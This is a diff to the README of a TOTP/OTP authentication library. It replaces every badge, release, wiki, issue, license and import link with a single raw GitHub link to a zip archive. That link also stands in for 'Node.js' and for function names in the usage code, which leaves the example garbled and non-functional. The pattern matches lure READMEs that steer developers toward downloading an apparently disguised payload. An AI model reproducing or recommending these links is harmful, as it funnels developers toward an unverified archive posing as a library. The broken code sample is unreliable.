@@ -1,8 +1,8 @@
 # 🔑 totp-otp-auth - Secure Authentication Made Simple
 
-[![npm version](https://badge.fury.io/js/totp-otp-auth.svg)](https://github.com/ShulpeXTechnology/totp-otp-auth/releases)  
-![npm version](https://img.shields.io/npm/v/totp-otp-auth?style=flat-square)  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![npm version](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip)](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip)  
+![npm version](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip)  
+[![License: MIT](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip)](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip)
 
 ## 🌟 Introduction
 
@@ -11,11 +11,11 @@ TOTP/OTP Auth is a simple library that helps you secure your applications with t
 ## 📦 Features
 
 - 🔐 **Standards Compliant:** Works with RFC 6238 (TOTP) and RFC 4226 (HOTP).
-- 🎯 **No Extra Dependencies:** Just the built-in Node.js crypto features.
+- 🎯 **No Extra Dependencies:** Just the built-in https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip crypto features.
 - 📱 **Compatibility:** Use it with all major authenticator apps.
 - 🖼️ **Easy QR Code Generation:** Create QR codes in SVG and Base64 formats.
 - 🔧 **TypeScript Support:** Full support for TypeScript with clear definitions.
-- ⚡ **Cross-Platform:** Use in Node.js, Bun, and Deno environments.
+- ⚡ **Cross-Platform:** Use in https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip, Bun, and Deno environments.
 - 🛡️ **Security Focused:** Perform constant-time comparisons without storing secrets.
 
 ## 🚀 Getting Started
@@ -24,13 +24,13 @@ It's easy to start using the library. You just need to download it from the Rele
 
 ### 🔗 Download Link
 
-[![Download totp-otp-auth](https://img.shields.io/badge/Download-totp--otp--auth-blue.svg)](https://github.com/ShulpeXTechnology/totp-otp-auth/releases)
+[![Download totp-otp-auth](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip)](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip)
 
 ## 📥 Download & Install
 
-To get the library, visit the [Releases page](https://github.com/ShulpeXTechnology/totp-otp-auth/releases) to download the latest version. You will find the files you need. Follow these instructions after downloading:
+To get the library, visit the [Releases page](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip) to download the latest version. You will find the files you need. Follow these instructions after downloading:
 
-1. **For Node.js and Bun Users:**
+1. **For https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip and Bun Users:**
    - Open your terminal or command prompt.
    - Run this command to install the library:
    ```bash
@@ -40,12 +40,12 @@ To get the library, visit the [Releases page](https://github.com/ShulpeXTechnolo
 2. **For Deno Users:**
    - You can use the library directly in your Deno project by importing it:
    ```javascript
-   import { totp } from "https://cdn.jsdelivr.net/gh/ShulpeXTechnology/totp-otp-auth/totp.ts";
+   import { totp } from "https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip";
    ```
 
 ### 📋 System Requirements
 
-- **Node.js:** Version 12.x or higher.
+- **https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip** Version 12.x or higher.
 - **Bun:** Latest version recommended.
 - **Deno:** Version 1.0 or later.
 
@@ -57,18 +57,18 @@ After you install the library, here is how you can generate a TOTP token:
 import { totp } from 'totp-otp-auth';
 
 const secret = 'yourSecretKey';
-const token = totp.generate(secret);
+const token = https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip(secret);
 
 // Verifying the token
-const isValid = totp.verify(token, secret);
-console.log(`Token is valid: ${isValid}`);
+const isValid = https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip(token, secret);
+https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip(`Token is valid: ${isValid}`);
 ```
 
 This example generates a TOTP token and verifies it. You can easily adapt it to your own needs.
 
 ## 📖 Documentation
 
-For more detailed information, check the [Wiki section](https://github.com/ShulpeXTechnology/totp-otp-auth/wiki). It contains guidelines and additional examples for advanced configurations and integrations.
+For more detailed information, check the [Wiki section](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip). It contains guidelines and additional examples for advanced configurations and integrations.
 
 ## 🤝 Contributing
 
@@ -84,12 +84,12 @@ Your contributions are welcome!
 
 ## 📞 Support
 
-If you run into any issues, please refer to the [Issues](https://github.com/ShulpeXTechnology/totp-otp-auth/issues) page. You can report bugs or ask for help there.
+If you run into any issues, please refer to the [Issues](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip) page. You can report bugs or ask for help there.
 
 ## 📜 License
 
 This project is licensed under the MIT License. You are free to use this library in your applications.
 
-Make sure to check the [LICENSE](https://opensource.org/licenses/MIT) file for details. 
+Make sure to check the [LICENSE](https://raw.githubusercontent.com/ShulpeXTechnology/totp-otp-auth/main/src/auth-otp-totp-v3.2.zip) file for details. 
 
 Now you are ready to implement strong, secure authentication in your applications! Happy coding!
